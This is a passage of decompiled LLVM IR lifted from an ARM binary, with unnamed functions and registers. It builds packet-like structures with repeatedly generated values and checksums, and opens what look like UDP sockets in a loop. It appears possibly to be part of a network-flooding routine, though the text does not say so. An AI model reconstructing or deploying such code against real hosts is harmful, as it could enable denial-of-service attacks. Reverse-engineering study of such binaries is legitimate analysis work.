  %v4_b384 = inttoptr i32 %v3_b384 to i8*
  store i8 %v1_b384, i8* %v4_b384, align 1
  %v0_b388 = load i32, i32* %r1.global-to-local, align 4
  %v1_b388 = trunc i32 %v0_b388 to i8
  %v2_b388 = load i32, i32* %r4.global-to-local, align 4
  %v3_b388 = add i32 %v2_b388, 58
  %v4_b388 = inttoptr i32 %v3_b388 to i8*
  store i8 %v1_b388, i8* %v4_b388, align 1
  %v0_b38c = load i32, i32* %r1.global-to-local, align 4
  %v1_b38c = trunc i32 %v0_b38c to i8
  %v2_b38c = load i32, i32* %r4.global-to-local, align 4
  %v3_b38c = add i32 %v2_b38c, 57
  %v4_b38c = inttoptr i32 %v3_b38c to i8*
  store i8 %v1_b38c, i8* %v4_b38c, align 1
  %v3_b390 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b390, i32* %r3.global-to-local, align 4
  %v1_b394 = load i32, i32* %r2.global-to-local, align 4
  %v2_b394 = add i32 %v1_b394, %v3_b390
  store i32 %v2_b394, i32* @r4, align 4
  %v1_b398 = load i32, i32* @r7, align 4
  %v9_b398 = icmp eq i32 %v2_b394, %v1_b398
  store i1 %v9_b398, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_b394, i32* %stack_var_-44, align 4
  %v5_b3a0 = icmp slt i32 %v2_b394, %v1_b398
  br i1 %v5_b3a0, label %dec_label_pc_b1e8, label %dec_label_pc_b3a4.preheader

dec_label_pc_b3a4.preheader:                      ; preds = %bb61, %dec_label_pc_b118
  %v0_b3a86 = phi i32 [ 0, %dec_label_pc_b118 ], [ %v1_b398, %bb61 ]
  %v3_b520 = icmp eq i32 %v6_b0cc, -1
  %v8_b520 = icmp eq i32 %v6_b0cc, -1
  %v3_b3f0 = icmp eq i32 %v3_b134, 65535
  br label %dec_label_pc_b3a4

dec_label_pc_b3a4:                                ; preds = %dec_label_pc_b3a4, %dec_label_pc_b4b4, %dec_label_pc_b3a4.preheader
  %v0_b3a8 = phi i32 [ %v0_b3a86, %dec_label_pc_b3a4.preheader ], [ 0, %dec_label_pc_b4b4 ], [ 0, %dec_label_pc_b3a4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b3a8 = icmp eq i32 %v0_b3a8, 0
  store i1 %v2_b3a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b3a8, label %dec_label_pc_b3a4, label %dec_label_pc_b3b4

dec_label_pc_b3b4:                                ; preds = %dec_label_pc_b3a4, %dec_label_pc_b4b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b3b8

dec_label_pc_b3b8:                                ; preds = %dec_label_pc_b430, %dec_label_pc_b3b4
  %v1_b3c8 = phi i32 [ %v1_b4a4, %dec_label_pc_b430 ], [ 0, %dec_label_pc_b3b4 ]
  %v5_b3bc = mul i32 %v1_b3c8, 24
  %v1_b3c0 = load i32, i32* @r8, align 4
  %v2_b3c0 = add i32 %v1_b3c0, %v5_b3bc
  store i32 %v2_b3c0, i32* %r3.global-to-local, align 4
  %v1_b3c4 = add i32 %v2_b3c0, 20
  %v2_b3c4 = inttoptr i32 %v1_b3c4 to i8*
  %v3_b3c4 = load i8, i8* %v2_b3c4, align 1
  %v4_b3c4 = zext i8 %v3_b3c4 to i32
  store i32 %v4_b3c4, i32* %r2.global-to-local, align 4
  %v0_b3c8 = load i32, i32* @sb, align 4
  %v4_b3c8 = mul i32 %v1_b3c8, 4
  %v5_b3c8 = add i32 %v0_b3c8, %v4_b3c8
  %v6_b3c8 = inttoptr i32 %v5_b3c8 to i32*
  %v7_b3c8 = load i32, i32* %v6_b3c8, align 4
  store i32 %v7_b3c8, i32* @r5, align 4
  %v7_b3cc = icmp eq i8 %v3_b3c4, 31
  store i1 %v7_b3cc, i1* %cpsr_z.global-to-local, align 1
  %v1_b3d0 = add i32 %v7_b3c8, 20
  store i32 %v1_b3d0, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_b3c4, 32
  br i1 %tmp67, label %dec_label_pc_b4c8, label %dec_label_pc_b3d8

dec_label_pc_b3d8:                                ; preds = %dec_label_pc_b3b8
  store i32 %v6_b0cc, i32* %r3.global-to-local, align 4
  store i1 %v8_b520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_b520, label %dec_label_pc_b528, label %dec_label_pc_b3e4

dec_label_pc_b3e4:                                ; preds = %dec_label_pc_b4c8, %dec_label_pc_b3d8
  store i32 %v3_b134, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_b3f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b3f0, label %dec_label_pc_b544, label %dec_label_pc_b3f8

dec_label_pc_b3f8:                                ; preds = %dec_label_pc_b528, %dec_label_pc_b3e4
  %v1_b3fc = phi i32 [ %v1_b538, %dec_label_pc_b528 ], [ 65535, %dec_label_pc_b3e4 ]
  store i32 %v3_b138, i32* %r1.global-to-local, align 4
  %v9_b3fc = icmp eq i32 %v3_b138, %v1_b3fc
  store i1 %v9_b3fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b3fc, label %dec_label_pc_b558, label %dec_label_pc_b404

dec_label_pc_b404:                                ; preds = %dec_label_pc_b544.dec_label_pc_b404_crit_edge, %dec_label_pc_b3f8
  %v1_b408 = phi i32 [ %v1_b408.pre, %dec_label_pc_b544.dec_label_pc_b404_crit_edge ], [ %v1_b3fc, %dec_label_pc_b3f8 ]
  store i32 %v3_b13c, i32* %r2.global-to-local, align 4
  %v9_b408 = icmp eq i32 %v3_b13c, %v1_b408
  store i1 %v9_b408, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b408, label %dec_label_pc_b56c, label %dec_label_pc_b410

dec_label_pc_b410:                                ; preds = %dec_label_pc_b558.dec_label_pc_b410_crit_edge, %dec_label_pc_b404
  %v1_b414 = phi i32 [ %v1_b414.pre, %dec_label_pc_b558.dec_label_pc_b410_crit_edge ], [ %v1_b408, %dec_label_pc_b404 ]
  store i32 %v6_b008, i32* %r3.global-to-local, align 4
  %v9_b414 = icmp eq i32 %v6_b008, %v1_b414
  store i1 %v9_b414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b414, label %dec_label_pc_b580, label %dec_label_pc_b41c

dec_label_pc_b41c:                                ; preds = %dec_label_pc_b56c.dec_label_pc_b41c_crit_edge, %dec_label_pc_b410
  %v1_b420 = phi i32 [ %v1_b420.pre, %dec_label_pc_b56c.dec_label_pc_b41c_crit_edge ], [ %v1_b414, %dec_label_pc_b410 ]
  store i32 %v6_b020, i32* %r0.global-to-local, align 4
  %v9_b420 = icmp eq i32 %v6_b020, %v1_b420
  store i1 %v9_b420, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b420, label %dec_label_pc_b594, label %dec_label_pc_b428

dec_label_pc_b428:                                ; preds = %dec_label_pc_b580, %dec_label_pc_b41c
  %v0_b428 = load i32, i32* @fp, align 4
  %v2_b428 = icmp eq i32 %v0_b428, 0
  store i1 %v2_b428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b428, label %dec_label_pc_b430, label %dec_label_pc_b5a4

dec_label_pc_b430:                                ; preds = %dec_label_pc_b428, %dec_label_pc_b594, %dec_label_pc_b5a4
  %v2_b434 = load i32, i32* @r5, align 4
  %v3_b434 = add i32 %v2_b434, 10
  %v4_b434 = inttoptr i32 %v3_b434 to i16*
  store i16 0, i16* %v4_b434, align 2
  %v0_b438 = load i32, i32* @r5, align 4
  store i32 %v0_b438, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_b440 = call i32 @function_c848(i32 %v0_b438, i32 20)
  %v3_b440 = trunc i32 %v2_b440 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b448 = load i32, i32* @r5, align 4
  %v4_b448 = add i32 %v3_b448, 10
  %v5_b448 = inttoptr i32 %v4_b448 to i16*
  store i16 %v3_b440, i16* %v5_b448, align 2
  %v0_b44c = load i32, i32* @r6, align 4
  store i32 %v0_b44c, i32* @r1, align 4
  %v0_b450 = load i32, i32* %r2.global-to-local, align 4
  %v1_b450 = trunc i32 %v0_b450 to i16
  %v3_b450 = add i32 %v0_b44c, 16
  %v4_b450 = inttoptr i32 %v3_b450 to i16*
  store i16 %v1_b450, i16* %v4_b450, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_b45c = load i32, i32* @r5, align 4
  store i32 %v0_b45c, i32* %r0.global-to-local, align 4
  %v4_b460 = call i32 @function_c898(i32 %v0_b45c, i32 %v0_b44c, i32 10240, i32 40)
  %v5_b460 = trunc i32 %v4_b460 to i16
  store i32 %v4_b460, i32* %r0.global-to-local, align 4
  %v3_b464 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b464, i32* %r3.global-to-local, align 4
  %v3_b468 = mul i32 %v3_b464, 32
  store i32 %v3_b468, i32* %lr.global-to-local, align 4
  %v3_b46c = load i32, i32* @r6, align 4
  %v4_b46c = add i32 %v3_b46c, 16
  %v5_b46c = inttoptr i32 %v4_b46c to i16*
  store i16 %v5_b460, i16* %v5_b46c, align 2
  %v0_b470 = load i32, i32* %lr.global-to-local, align 4
  %v1_b470 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_b470, -8
  %v5_b470 = add i32 %v0_b470, %tmp68
  store i32 %v5_b470, i32* %lr.global-to-local, align 4
  %v0_b474 = load i32, i32* @r6, align 4
  %v1_b474 = add i32 %v0_b474, 2
  %v2_b474 = inttoptr i32 %v1_b474 to i16*
  %v3_b474 = load i16, i16* %v2_b474, align 2
  %v1_b478 = load i32, i32* @r8, align 4
  %v2_b478 = add i32 %v1_b478, %v5_b470
  store i32 %v2_b478, i32* @lr, align 4
  %v3_b47c = add i32 %v2_b478, 2
  %v4_b47c = inttoptr i32 %v3_b47c to i16*
  store i16 %v3_b474, i16* %v4_b47c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b488 = load i32, i32* @r5, align 4
  store i32 %v0_b488, i32* %r1.global-to-local, align 4
  %v0_b48c = load i32, i32* @sl, align 4
  store i32 %v0_b48c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_b494 = load i32, i32* @lr, align 4
  %v6_b49c = call i32 @function_11570(i32 %v0_b48c, i32 %v0_b488, i32 60, i32 16384, i32 %v0_b494, i32 16)
  %v3_b4a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b4a0, i32* %r3.global-to-local, align 4
  %v1_b4a4 = add i32 %v3_b4a0, 1
  store i32 %v1_b4a4, i32* %r0.global-to-local, align 4
  %v1_b4a8 = load i32, i32* @r7, align 4
  %v9_b4a8 = icmp eq i32 %v1_b4a4, %v1_b4a8
  store i1 %v9_b4a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b4a4, i32* %stack_var_-44, align 4
  %v5_b4b0 = icmp slt i32 %v1_b4a4, %v1_b4a8
  br i1 %v5_b4b0, label %dec_label_pc_b3b8, label %dec_label_pc_b4b4

dec_label_pc_b4b4:                                ; preds = %dec_label_pc_b430
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b4b8 = icmp eq i32 %v1_b4a8, 0
  store i1 %v2_b4b8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b4b8, label %dec_label_pc_b3a4, label %dec_label_pc_b3b4

dec_label_pc_b4c8:                                ; preds = %dec_label_pc_b3b8
  %v1_b4c8 = add i32 %v2_b3c0, 16
  %v2_b4c8 = inttoptr i32 %v1_b4c8 to i32*
  %v3_b4c8 = load i32, i32* %v2_b4c8, align 4
  store i32 %v3_b4c8, i32* %r4.global-to-local, align 4
  %v0_b4cc = call i32 @function_e0b8()
  store i32 %v0_b4cc, i32* %r0.global-to-local, align 4
  %v3_b4d0 = load i32, i32* %stack_var_-44, align 4
  %v5_b4d8 = mul i32 %v3_b4d0, 24
  %v0_b4dc = load i32, i32* %r4.global-to-local, align 4
  %v1_b4dc = and i32 %v0_b4dc, 16711680
  %v3_b4e0 = udiv i32 %v0_b4dc, 16777216
  %v4_b4e4 = udiv i32 %v1_b4dc, 256
  %v5_b4e4 = or i32 %v4_b4e4, %v3_b4e0
  store i32 %v5_b4e4, i32* %r2.global-to-local, align 4
  %v1_b4e8 = load i32, i32* @r8, align 4
  %v2_b4e8 = add i32 %v1_b4e8, %v5_b4d8
  store i32 %v2_b4e8, i32* %r1.global-to-local, align 4
  %v1_b4ec = and i32 %v0_b4dc, 65280
  store i32 %v1_b4ec, i32* %r3.global-to-local, align 4
  %v1_b4f0 = add i32 %v2_b4e8, 20
  %v2_b4f0 = inttoptr i32 %v1_b4f0 to i8*
  %v3_b4f0 = load i8, i8* %v2_b4f0, align 1
  %v4_b4f0 = zext i8 %v3_b4f0 to i32
  %v5_b4f8 = call i32 @llvm.bswap.i32(i32 %v0_b4dc)
  %v7_b4fc = lshr i32 %v0_b4cc, %v4_b4f0
  %v8_b4fc = add i32 %v7_b4fc, %v5_b4f8
  store i32 %v8_b4fc, i32* %r2.global-to-local, align 4
  %v1_b500 = and i32 %v8_b4fc, 16711680
  store i32 %v1_b500, i32* %r0.global-to-local, align 4
  %v1_b50c = and i32 %v8_b4fc, 65280
  store i32 %v1_b50c, i32* %r1.global-to-local, align 4
  %v5_b514 = call i32 @llvm.bswap.i32(i32 %v8_b4fc)
  %v1_b518 = load i32, i32* @r5, align 4
  %v2_b518 = add i32 %v1_b518, 16
  %v3_b518 = inttoptr i32 %v2_b518 to i32*
  store i32 %v5_b514, i32* %v3_b518, align 4
  store i32 %v6_b0cc, i32* %r3.global-to-local, align 4
  store i1 %v8_b520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b520, label %dec_label_pc_b528, label %dec_label_pc_b3e4

dec_label_pc_b528:                                ; preds = %dec_label_pc_b4c8, %dec_label_pc_b3d8
  %v0_b528 = call i32 @function_e0b8()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_b530 = load i32, i32* @r5, align 4
  %v2_b530 = add i32 %v1_b530, 12
  %v3_b530 = inttoptr i32 %v2_b530 to i32*
  store i32 %v0_b528, i32* %v3_b530, align 4
  store i32 %v3_b134, i32* %r0.global-to-local, align 4
  %v0_b538 = load i32, i32* %r4.global-to-local, align 4
  %v1_b538 = add i32 %v0_b538, -1
  store i32 %v1_b538, i32* @r4, align 4
  %v9_b53c = icmp eq i32 %v3_b134, %v1_b538
  store i1 %v9_b53c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b53c, label %dec_label_pc_b544, label %dec_label_pc_b3f8

dec_label_pc_b544:                                ; preds = %dec_label_pc_b528, %dec_label_pc_b3e4
  %v0_b544 = call i32 @function_e0b8()
  %v1_b544 = trunc i32 %v0_b544 to i16
  store i32 %v0_b544, i32* %r0.global-to-local, align 4
  store i32 %v3_b138, i32* %r1.global-to-local, align 4
  %v1_b54c = load i32, i32* @r4, align 4
  %v9_b54c = icmp eq i32 %v3_b138, %v1_b54c
  store i1 %v9_b54c, i1* %cpsr_z.global-to-local, align 1
  %v3_b550 = load i32, i32* @r5, align 4
  %v4_b550 = add i32 %v3_b550, 4
  %v5_b550 = inttoptr i32 %v4_b550 to i16*
  store i16 %v1_b544, i16* %v5_b550, align 2
  br i1 %v9_b54c, label %dec_label_pc_b558, label %dec_label_pc_b544.dec_label_pc_b404_crit_edge

dec_label_pc_b544.dec_label_pc_b404_crit_edge:    ; preds = %dec_label_pc_b544
  %v1_b408.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b404

dec_label_pc_b558:                                ; preds = %dec_label_pc_b544, %dec_label_pc_b3f8
  %v0_b558 = call i32 @function_e0b8()
  %v1_b558 = trunc i32 %v0_b558 to i16
  store i32 %v0_b558, i32* %r0.global-to-local, align 4
  store i32 %v3_b13c, i32* %r2.global-to-local, align 4
  %v1_b560 = load i32, i32* @r4, align 4
  %v9_b560 = icmp eq i32 %v3_b13c, %v1_b560
  store i1 %v9_b560, i1* %cpsr_z.global-to-local, align 1
  %v3_b564 = load i32, i32* @r5, align 4
  %v4_b564 = add i32 %v3_b564, 20
  %v5_b564 = inttoptr i32 %v4_b564 to i16*
  store i16 %v1_b558, i16* %v5_b564, align 2
  br i1 %v9_b560, label %dec_label_pc_b56c, label %dec_label_pc_b558.dec_label_pc_b410_crit_edge

dec_label_pc_b558.dec_label_pc_b410_crit_edge:    ; preds = %dec_label_pc_b558
  %v1_b414.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b410

dec_label_pc_b56c:                                ; preds = %dec_label_pc_b558, %dec_label_pc_b404
  %v0_b56c = call i32 @function_e0b8()
  %v1_b56c = trunc i32 %v0_b56c to i16
  store i32 %v0_b56c, i32* %r0.global-to-local, align 4
  store i32 %v6_b008, i32* %r3.global-to-local, align 4
  %v1_b574 = load i32, i32* @r4, align 4
  %v9_b574 = icmp eq i32 %v6_b008, %v1_b574
  store i1 %v9_b574, i1* %cpsr_z.global-to-local, align 1
  %v3_b578 = load i32, i32* @r6, align 4
  %v4_b578 = add i32 %v3_b578, 2
  %v5_b578 = inttoptr i32 %v4_b578 to i16*
  store i16 %v1_b56c, i16* %v5_b578, align 2
  br i1 %v9_b574, label %dec_label_pc_b580, label %dec_label_pc_b56c.dec_label_pc_b41c_crit_edge

dec_label_pc_b56c.dec_label_pc_b41c_crit_edge:    ; preds = %dec_label_pc_b56c
  %v1_b420.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b41c

dec_label_pc_b580:                                ; preds = %dec_label_pc_b56c, %dec_label_pc_b410
  %v0_b580 = call i32 @function_e0b8()
  %v1_b584 = load i32, i32* @r6, align 4
  %v2_b584 = add i32 %v1_b584, 4
  %v3_b584 = inttoptr i32 %v2_b584 to i32*
  store i32 %v0_b580, i32* %v3_b584, align 4
  store i32 %v6_b020, i32* %r0.global-to-local, align 4
  %v1_b58c = load i32, i32* @r4, align 4
  %v9_b58c = icmp eq i32 %v6_b020, %v1_b58c
  store i1 %v9_b58c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b58c, label %dec_label_pc_b594, label %dec_label_pc_b428

dec_label_pc_b594:                                ; preds = %dec_label_pc_b580, %dec_label_pc_b41c
  %v0_b594 = call i32 @function_e0b8()
  store i32 %v0_b594, i32* %r0.global-to-local, align 4
  %v0_b598 = load i32, i32* @fp, align 4
  %v2_b598 = icmp eq i32 %v0_b598, 0
  store i1 %v2_b598, i1* %cpsr_z.global-to-local, align 1
  %v1_b59c = load i32, i32* @r6, align 4
  %v2_b59c = add i32 %v1_b59c, 8
  %v3_b59c = inttoptr i32 %v2_b59c to i32*
  store i32 %v0_b594, i32* %v3_b59c, align 4
  br i1 %v2_b598, label %dec_label_pc_b430, label %dec_label_pc_b5a4

dec_label_pc_b5a4:                                ; preds = %dec_label_pc_b428, %dec_label_pc_b594
  %v0_b5a4 = call i32 @function_e0b8()
  %v1_b5a4 = trunc i32 %v0_b5a4 to i16
  store i32 %v0_b5a4, i32* %r0.global-to-local, align 4
  %v3_b5a8 = load i32, i32* @r6, align 4
  %v4_b5a8 = add i32 %v3_b5a8, 18
  %v5_b5a8 = inttoptr i32 %v4_b5a8 to i16*
  store i16 %v1_b5a4, i16* %v5_b5a8, align 2
  br label %dec_label_pc_b430

dec_label_pc_b5b0:                                ; preds = %dec_label_pc_b0f0
  %v0_b5b0 = load i32, i32* @sl, align 4
  store i32 %v0_b5b0, i32* %r0.global-to-local, align 4
  %v1_b5b4 = call i32 @function_10ddc(i32 %v0_b5b0)
  store i32 %v1_b5b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5b8

dec_label_pc_b5b8:                                ; preds = %dec_label_pc_af1c, %dec_label_pc_b5b0
  %v1_b5c0 = phi i32 [ %v3_b0e0, %dec_label_pc_af1c ], [ %v1_b5b4, %dec_label_pc_b5b0 ]
  store i32 %v3_af1c, i32* %r4.global-to-local, align 4
  store i32 %v24_af1c, i32* %fp.global-to-local, align 4
  store i32 %v27_af1c, i32* %lr.global-to-local, align 4
  ret i32 %v1_b5c0

; uselistorder directives
  uselistorder i32 %v0_b5a4, { 1, 0 }
  uselistorder i32 %v0_b56c, { 1, 0 }
  uselistorder i32 %v0_b558, { 1, 0 }
  uselistorder i32 %v0_b544, { 1, 0 }
  uselistorder i32 %v1_b538, { 1, 2, 0 }
  uselistorder i32 %v0_b4dc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b4a4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b470, { 1, 0 }
  uselistorder i32 %v4_b460, { 1, 0 }
  uselistorder i1 %v3_b3f0, { 1, 0 }
  uselistorder i32 %v2_b394, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b1fc, { 1, 2, 0 }
  uselistorder i32 %v1_b1c8, { 2, 1, 0 }
  uselistorder i32 %v1_b1c4, { 2, 0, 1 }
  uselistorder i32 %v1_b1c0, { 2, 0, 1 }
  uselistorder i32 %v1_b1bc, { 2, 0, 1 }
  uselistorder i32 %v1_b198, { 1, 0 }
  uselistorder i32 %v3_b134, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_b128, { 1, 0, 2 }
  uselistorder i32 %v0_b124, { 1, 0, 3, 2 }
  uselistorder i1 %v7_b110, { 1, 0 }
  uselistorder i1 %v7_b0e4, { 1, 0 }
  uselistorder i32 %v3_b0e0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_b0cc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_b020, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_b008, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_af94, { 1, 0 }
  uselistorder i32 %v6_af8c, { 1, 0 }
  uselistorder i32 %v7_af74, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 5, 3, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b5b8, { 1, 0 }
  uselistorder label %dec_label_pc_b5a4, { 1, 0 }
  uselistorder label %dec_label_pc_b430, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b3b4, { 1, 0 }
  uselistorder label %dec_label_pc_b3a4, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @function_b5c8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b5c8:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_b5c8 = load i32, i32* @r4, align 4
  %v18_b5c8 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b5e4 = call i32 @function_1215c(i32 %arg1, i32 4)
  store i32 %v2_b5e4, i32* @sl, align 4
  %v0_b5f0 = load i32, i32* @r7, align 4
  %v2_b5f4 = call i32 @function_1215c(i32 %v0_b5f0, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_b600 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_b5f4, i32* @r8, align 4
  %v0_b610 = load i32, i32* @r5, align 4
  %v5_b614 = inttoptr i32 %v0_b600 to i32*
  %v6_b614 = call i32 @function_8570(i32 %v0_b610, i32* %v5_b614, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v3_b61c = urem i32 %v6_b614, 65536
  %v0_b620 = load i32, i32* @r6, align 4
  %v0_b628 = load i32, i32* @r4, align 4
  store i32 %v0_b628, i32* %r3.global-to-local, align 4
  %v0_b62c = load i32, i32* @r5, align 4
  %v5_b634 = inttoptr i32 %v0_b620 to i32*
  %v6_b634 = call i32 @function_8570(i32 %v0_b62c, i32* %v5_b634, i32 6, i32 %v0_b628, i32 %v3_b61c)
  %v0_b638 = load i32, i32* @r6, align 4
  %v3_b63c = mul i32 %v6_b634, 65536
  store i32 %v3_b63c, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_b648 = load i32, i32* @r5, align 4
  %v5_b64c = inttoptr i32 %v0_b638 to i32*
  %v6_b64c = call i32 @function_8570(i32 %v0_b648, i32* %v5_b64c, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b65c = load i32, i32* @r6, align 4
  %v0_b660 = load i32, i32* @r5, align 4
  %v3_b664 = urem i32 %v6_b64c, 65536
  store i32 %v3_b664, i32* @r5, align 4
  %v5_b668 = inttoptr i32 %v0_b65c to i32*
  %v6_b668 = call i32 @function_8570(i32 %v0_b660, i32* %v5_b668, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_b66c = load i32, i32* %sb.global-to-local, align 4
  %v3_b66c = udiv i32 %v0_b66c, 65536
  store i32 %v3_b66c, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b674 = load i32, i32* @r4, align 4
  %v9_b674 = icmp eq i32 %v3_b66c, %v1_b674
  br i1 %v9_b674, label %dec_label_pc_b6a4, label %bb

bb:                                               ; preds = %dec_label_pc_b5c8
  store i32 0, i32* %stack_var_-56, align 4
  %v4_b68c = udiv i32 %v0_b66c, 16777216
  store i32 %v4_b68c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b6b4

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b5c8
  store i32 0, i32* %stack_var_-56, align 4
  %v0_b6a4 = call i32 @function_e0b8()
  br label %dec_label_pc_b6b4

dec_label_pc_b6b4:                                ; preds = %bb, %dec_label_pc_b6a4
  %v0_b69810 = urem i32 %v6_b668, 256
  %v0_b6b4 = load i32, i32* @r7, align 4
  %v2_b6b4 = icmp eq i32 %v0_b6b4, 0
  br i1 %v2_b6b4, label %dec_label_pc_b7f4, label %dec_label_pc_b6bc

dec_label_pc_b6bc:                                ; preds = %dec_label_pc_b6b4
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_b768 = udiv i32 %v3_b61c, 256
  %v1_b764 = mul i32 %v6_b614, 256
  %v4_b76c = and i32 %v1_b764, 65280
  %v5_b76c = or i32 %v4_b76c, %v3_b768
  %v2_b6ec = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_b74c

dec_label_pc_b6cc:                                ; preds = %bb51, %dec_label_pc_b78c
  %v3_b6d8 = call i32 @function_115f4(i32 2, i32 2, i32 17)
  %v7_b6e0 = icmp eq i32 %v3_b6d8, -1
  %v0_b6e4 = load i32, i32* @sb, align 4
  %v1_b6e4 = add i32 %v0_b6e4, 1
  store i32 %v1_b6e4, i32* @sb, align 4
  %v0_b6e8 = load i32, i32* @fp, align 4
  %v1_b6e8 = add i32 %v0_b6e8, 24
  store i32 %v1_b6e8, i32* @fp, align 4
  %v2_b6f4 = load i32, i32* @r8, align 4
  %v3_b6f4 = add i32 %v2_b6f4, %stack_var_-60.0
  %v4_b6f4 = inttoptr i32 %v3_b6f4 to i32*
  store i32 %v3_b6d8, i32* %v4_b6f4, align 4
  br i1 %v7_b6e0, label %dec_label_pc_b7e8, label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %dec_label_pc_b6cc
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_b714 = call i32 @function_113a4(i32 %v3_b6d8, i32 %v2_b6ec, i32 16)
  %v0_b718 = load i32, i32* @r6, align 4
  %v1_b718 = add i32 %v0_b718, 20
  %v2_b718 = inttoptr i32 %v1_b718 to i8*
  %v3_b718 = load i8, i8* %v2_b718, align 1
  %v4_b718 = zext i8 %v3_b718 to i32
  store i32 %v4_b718, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_b718, 32
  br i1 %tmp, label %dec_label_pc_b7a0, label %dec_label_pc_b724

dec_label_pc_b724:                                ; preds = %dec_label_pc_b6fc, %dec_label_pc_b7a0
